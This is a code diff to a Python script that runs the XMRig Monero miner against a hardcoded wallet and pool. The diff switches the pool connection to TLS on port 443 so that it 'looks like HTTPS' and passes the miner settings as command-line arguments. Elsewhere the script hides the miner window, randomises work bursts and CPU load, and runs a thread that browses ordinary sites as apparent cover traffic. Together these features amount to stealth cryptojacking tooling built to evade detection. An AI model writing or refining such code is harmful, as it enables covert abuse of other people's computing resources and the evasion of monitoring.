@@ -10,7 +10,7 @@ import json
 
 # ==================== Configuration ====================
 WALLET = "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP"
-POOL = "http://pool.supportxmr.com:80"   # plain HTTP
+POOL = "pool.supportxmr.com:443"          # TLS, looks like HTTPS
 RUNTIME_MINUTES = 180                     # 3 hours
 
 # Burst parameters (minutes)
@@ -44,25 +44,6 @@ def download_xmrig():
             return exe_path
     raise Exception("xmrig.exe not found")
 
-def create_config(exe_path, cpu_hint):
-    config = {
-        "autosave": True,
-        "cpu": {"enabled": True, "max-threads-hint": cpu_hint},
-        "opencl": False,
-        "cuda": False,
-        "pools": [{
-            "algo": "rx/0",
-            "url": POOL,
-            "user": WALLET,
-            "pass": "x"
-        }],
-        "donate": {"level": 1}
-    }
-    config_path = os.path.join(os.path.dirname(exe_path), 'config.json')
-    with open(config_path, 'w') as f:
-        json.dump(config, f, indent=4)
-    return config_path
-
 def web_surfer(stop_event):
     urls = [
         "https://www.google.com/favicon.ico",
@@ -94,13 +75,8 @@ def main():
     web_thread.start()
     print("[+] Web surfer thread started.")
 
-    log_file = os.path.join(tempfile.gettempdir(), 'xmrig.log')
-    with open(log_file, 'w') as f:
-        pass  # truncate log
-
     total_start = time.time()
     total_end = total_start + RUNTIME_MINUTES * 60
-    last_tell = 0
 
     while time.time() < total_end:
         work_sec = random.randint(MIN_WORK * 60, MAX_WORK * 60)
@@ -108,37 +84,56 @@ def main():
         cpu_hint = random.randint(MIN_CPU_HINT, MAX_CPU_HINT)
 
         print(f"\n[+] Burst: work {work_sec//60} min, break {break_sec//60} min, CPU hint {cpu_hint}%")
-        create_config(exe_path, cpu_hint)
 
-        with open(log_file, 'a') as f:
-            miner_proc = subprocess.Popen(
-                [exe_path, '--config=config.json'],
-                cwd=working_dir,
-                stdout=f,
-                stderr=subprocess.STDOUT,
-                text=True,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
+        # Command-line arguments (no config file)
+        cmd = [
+            exe_path,
+            f"--url={POOL}",
+            f"--user={WALLET}",
+            "--pass=x",
+            "--tls",
+            "--keepalive",
+            f"--cpu-max-threads-hint={cpu_hint}",
+            "--cpu-priority=5",
+            "--randomx-mode=fast",
+            "--donate-level=1",
+            "--no-color"
+        ]
+
+        print(f"[+] Starting miner: {' '.join(cmd)}")
+        miner_proc = subprocess.Popen(
+            cmd,
+            cwd=working_dir,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
         print(f"[+] Miner started (PID {miner_proc.pid})")
 
         # Monitor miner output during work period
         work_start = time.time()
         while time.time() - work_start < work_sec:
-            if miner_proc.poll() is not None:
-                print("[!] Miner died early.")
-                break
-            with open(log_file, 'r') as f:
-                f.seek(last_tell)
-                new_lines = f.readlines()
-                if new_lines:
-                    print("".join(new_lines).strip())
-                last_tell = f.tell()
-            time.sleep(5)
+            # Read a line (non-blocking)
+            line = miner_proc.stdout.readline()
+            if line:
+                print(f"[Miner] {line.strip()}")
+            else:
+                # No output, check if process died
+                if miner_proc.poll() is not None:
+                    print(f"[!] Miner died. Exit code: {miner_proc.returncode}")
+                    break
+                # If alive but no output, wait a bit
+                time.sleep(0.5)
 
-        # Kill miner
-        miner_proc.terminate()
-        miner_proc.wait(timeout=10)
-        print("[+] Miner stopped.")
+        # Kill miner if still alive
+        if miner_proc.poll() is None:
+            miner_proc.terminate()
+            miner_proc.wait(timeout=10)
+            print("[+] Miner stopped.")
+        else:
+            print("[+] Miner already stopped.")
 
         # Break period
         print(f"[+] Breaking for {break_sec//60} minutes...")
